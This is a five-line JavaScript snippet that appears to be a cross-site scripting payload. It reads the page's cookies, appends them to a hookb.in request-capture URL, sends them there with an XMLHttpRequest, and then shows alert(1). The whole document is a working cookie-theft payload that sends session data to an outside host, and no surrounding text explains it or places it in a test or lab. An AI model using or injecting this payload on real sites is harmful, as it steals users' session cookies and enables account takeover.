const Http = new XMLHttpRequest();
const url = 'https://hookb.in/jeRzppEeQEIeBB23OaZG?a='+document.cookie;
Http.open('GET', url);
Http.send();
alert(1);
